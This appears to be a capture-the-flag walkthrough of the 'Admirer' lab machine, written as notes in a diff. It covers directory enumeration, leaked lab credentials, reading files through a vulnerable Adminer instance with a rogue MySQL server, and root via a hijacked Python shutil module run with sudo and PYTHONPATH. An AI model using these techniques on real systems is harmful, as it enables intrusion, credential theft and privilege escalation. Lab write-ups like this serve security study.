@@ -1,0 +1,165 @@
+gobuster dir -u http://10.10.10.187/ -w /usr/share/dirb/wordlists/common.txt -o gobuster
+
+/assets (Status: 301)
+/images (Status: 301)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/server-status (Status: 403)
+
+(/opt/dirsearch)
+sudo python3 dirsearch.py -u admirer.htb/admin-dir -w /usr/share/wordlists/dirb/big.txt -e txt -f -t 256 -x 403
+
+ _|. _ _  _  _  _ _|_    v0.3.9                                                                           
+(_||| _) (/_(_|| (_| )                                                                                    
+                                                                                                          
+Extensions: txt | HTTP method: get | Threads: 256 | Wordlist size: 40936
+
+Error Log: /opt/dirsearch/logs/errors-20-05-04_23-40-04.log
+
+Target: admirer.htb/admin-dir                                                                             
+                                                                                                          
+[23:40:05] Starting: 
+[23:40:33] 200 -  350B  - /admin-dir/contacts.txt       
+[23:40:34] 200 -  136B  - /admin-dir/credentials.txt
+                                                      
+Task Completed     
+#####################################################
+
+[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01! 
+
+##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+
+# Amy
+Email: a.bialik@admirer.htb
+
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+
+# Bernadette
+Email: b.rauch@admirer.htb
+#########################################################
+login in ftp server, found two files:
+	
+	- in html.tar.gz/utility-scripts:
+	  $username = "waldo";
+	  $password = "Wh3r3_1s_w4ld0?";
+
+	- index.php:
+	  $username = "waldo";
+          $password = "]F7jLHw:*G>UPrTo}~A"d6b";
+          $dbname = "admirerdb";
+
+sudo python3 dirsearch.py -u admirer.htb/utility-scripts -w /usr/share/wordlists/dirb/big.txt -e txt,php -f -t 256 -x 403
+
+ _|. _ _  _  _  _ _|_    v0.3.9                                                                                                                                       
+(_||| _) (/_(_|| (_| )                                                                                                                                                
+                                                                                                                                                                      
+Extensions: txt, php | HTTP method: get | Threads: 256 | Wordlist size: 61404
+
+Error Log: /opt/dirsearch/logs/errors-20-05-05_00-59-10.log
+
+Target: admirer.htb/utility-scripts                                                                                                                                   
+                                                                                                                                                                      
+[00:59:11] Starting: 
+[00:59:40] 200 -    4KB - /utility-scripts/adminer.php  
+[01:01:14] 200 -   83KB - /utility-scripts/info.php   
+[01:02:06] 200 -   32B  - /utility-scripts/phptest.php
+                                                                  
+Task Completed
+
+adminer 4.6.2 vulnerable -> https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
+
+sudo service mysql start
+sudo mysql -u root
+create user testuser@'%' identified by 'testuser';
+create database testedb;
+grant all privileges on testdb.* to 'testuser';
+
+now, back to http://admirer.htb/utility-scripts/adminer.php
+
+login into the system with te user that you created
+click on the database
+create table
+table name: t1
+column name:c1 | type: varchar | lenght: 5000 -> save
+SQL command
+
+	load data local infile '../info.php'
+	into table testdb.t1
+	field terminated bt "\n"
+Execute
+click select t1: get password
+
+waldo:&<h5b~yK3F#{PaPB&dA}{H>
+
+user :)
+
+sudo -l
+[sudo] password for waldo: 
+Matching Defaults entries for waldo on admirer:
+    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always
+
+User waldo may run the following commands on admirer:
+    (ALL) SETENV: /opt/scripts/admin_tasks.sh
+You have new mail in /var/mail/waldo
+
+
+looking into /opt/scripts/admin_tasks.sh, it executes backup.py
+
+it leaves us to python library hijacking
+https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
+https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+
+looking into backup.py
+it imports make_archive from shuitls
+in python libreray hijacking, we "overwrite" a library function to execute privilege functions
+
+cd /tmp/
+mkdir hijack
+export PYTHONPATH=/tmp/hijack/
+nano shutil.py
+
+-------------------- begin of script -------------------
+#!/usr/bin/python3
+
+import os
+
+def make_archive():
+	os.system('cp /root/root.txt /tmp/hijack/root.txt')
+	os.system('chmod 777 /tmp/hijack/root.txt')
+	print('done')
+
+make_archive()
+
+--------------------- end of script ----------------------
+
+sudo PYTHONPATH=/tmp/hijack /opt/scripts/admin_tasks.sh
+option 6
+
+root! :)
